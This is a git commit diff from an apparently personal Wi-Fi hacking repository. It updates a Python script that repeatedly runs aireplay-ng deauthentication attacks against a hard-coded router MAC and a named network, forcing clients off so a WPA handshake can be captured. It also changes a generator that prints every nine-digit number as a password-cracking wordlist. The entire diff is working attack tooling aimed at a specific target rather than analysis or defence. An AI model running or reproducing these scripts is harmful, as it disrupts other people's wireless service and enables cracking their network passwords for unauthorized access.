60c6f3b8c40e8556ff8b072f3a41edc4741dd1d7
Joao Paulo <joaopaulo.a.p@gmail.com>
2019-01-27 20:10:31 -0200

    Deauth attack

--- hack wifi/force_handshake.py
+++ hack wifi/force_handshake.py
@@ -1,16 +1,17 @@
 from os import system
 from time import sleep
 
-ROUTER_MAC = 'B0:4E:26:60:2C:86'
-CLIENT_MAC = ['C0:11:73:C7:2A:58','64:5A:04:52:CF:C0']
-INTERFACE = 'wlp0s18f2u3mon'
-ESSID = 'KALI'
+ROUTER_MAC = '94:2C:B3:45:41:F1'
+CLIENT_MAC = ['18:89:5B:00:DF:72','9C:FC:01:86:7B:75']
+INTERFACE = 'wlp0s18f0u3mon'
+ESSID = '"Jiang Songhai"'
 
 
 def deauth():
     while True:
         for x in CLIENT_MAC:
-            system('aireplay-ng -0 2 -a {} -c {} -e {} {}'.format(ROUTER_MAC, x, ESSID, INTERFACE))
+            # system('aireplay-ng -0 5 -a {} -c {} -e {} {}'.format(ROUTER_MAC, x, ESSID, INTERFACE))
+            system('aireplay-ng -0 5 -a {} -e {} {}'.format(ROUTER_MAC, ESSID, INTERFACE))
             sleep(3)
 
 deauth()
--- wordlist/generate.py
+++ wordlist/generate.py
@@ -1,18 +1,20 @@
-from itertools import permutations, combinations_with_replacement
+from itertools import permutations, combinations_with_replacement, accumulate
 from string import ascii_lowercase, digits
 
+keys = 9
+
 def permutation():
-    s = ascii_lowercase+digits
+    s = digits
     data = ''
-    # result = permutations(s, 8) #Nao repete os caracteres
-    result = combinations_with_replacement(s, 8)
+    result = permutations(s, keys) #Nao repete os caracteres
+    # result = combinations_with_replacement(s, 4)
     for x in result:
         print(data.join(x))
 
 def default_string():
-    for x in range(10**8):
-        print(format(x, '08'))
+    for x in range(10**keys):
+        print(format(x, '0{}'.format(keys)))
 
 
-# default_string()
-permutation()
+default_string()
+# permutation()
